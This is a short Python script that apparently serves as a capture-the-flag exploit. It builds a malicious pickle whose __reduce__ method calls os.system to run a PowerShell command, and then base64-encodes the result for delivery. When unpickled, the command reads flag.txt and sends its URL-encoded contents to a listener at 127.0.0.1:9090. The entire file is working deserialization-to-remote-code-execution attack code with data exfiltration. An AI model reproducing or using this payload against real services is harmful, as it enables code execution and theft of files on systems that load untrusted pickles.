import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ('powershell -c "$content = [System.Net.WebUtility]::UrlEncode((Get-Content -Path flag.txt -Raw)); Invoke-WebRequest -Uri (\'http://127.0.0.1:9090/\' + $content) -Method GET"',)

malicious_pickle = pickle.dumps(RCE())
encoded_pickle = base64.b64encode(malicious_pickle).decode()

print(encoded_pickle)